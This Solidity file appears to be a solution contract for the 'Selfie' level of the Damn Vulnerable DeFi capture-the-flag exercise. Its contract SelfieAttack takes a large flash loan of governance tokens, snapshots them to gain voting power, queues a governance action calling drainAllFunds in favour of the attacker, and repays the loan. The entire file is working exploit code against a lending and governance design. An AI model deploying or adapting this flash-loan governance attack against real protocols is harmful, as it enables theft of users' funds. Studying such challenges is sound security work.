// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./SelfiePool.sol";
import "./SimpleGovernance.sol";
import "../DamnValuableTokenSnapshot.sol";

contract SelfieAttack {
    SelfiePool private pool;
    address private owner;
    SimpleGovernance private gov;

    constructor(address poolAddress, address govAddress) {
        pool = SelfiePool(poolAddress);
        owner = msg.sender;
        gov = SimpleGovernance(govAddress);
    }

    function receiveTokens(address tokenAddress, uint256 amount) external {
        DamnValuableTokenSnapshot(tokenAddress).snapshot();
        gov.queueAction(
            address(pool),
            abi.encodeWithSignature("drainAllFunds(address)", owner, amount),
            0
        );

        DamnValuableTokenSnapshot(tokenAddress).transfer(address(pool), amount);
    }

    function attack() public {
        require(msg.sender == owner);
        pool.flashLoan(1500000 ether);
    }
}
